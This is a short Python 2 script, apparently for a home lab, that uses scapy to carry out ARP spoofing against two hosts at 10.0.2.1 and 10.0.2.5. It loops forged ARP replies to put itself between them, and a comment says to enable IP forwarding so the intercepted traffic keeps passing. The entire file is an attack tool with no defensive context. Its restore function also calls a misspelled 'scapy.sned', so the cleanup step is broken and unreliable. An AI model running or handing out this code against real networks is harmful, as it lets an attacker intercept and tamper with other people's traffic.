#!/usr/bin/python
# python 2
# need to forward traffic by changing the file contents below from 0 to 1
# echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy


def restore(destinationIp, sourceIp):
    targetMac = getTargetMac(destinationIp)
    sourceMac = getTargetMac(sourceIp)
    packet = scapy.ARP(op=2, pdst=destinationIp, hwdst=targetMac, psrc=sourceIp, hwsrc=sourceMac)
    scapy.sned(packet, verbose=False)


def getTargetMac(targetIp):
    arpRequest = scapy.ARP(pdst=targetIp)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalPacket = broadcast/arpRequest
    # first part of the list is the answer
    answer = scapy.srp(finalPacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)


def spoofArp(targetIp, spoofedIp):
    mac = getTargetMac(targetIp)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=targetIp, psrc=spoofedIp)
    scapy.send(packet, verbose=False)


def main():
    try:
        while True:
            spoofArp("10.0.2.1","10.0.2.5")
            spoofArp("10.0.2.5","10.0.2.1")
    except KeyboardInterrupt:
        restore("10.0.2.1","10.0.2.5")
        restore("10.0.2.5","10.0.2.1")
        exit(0)


main()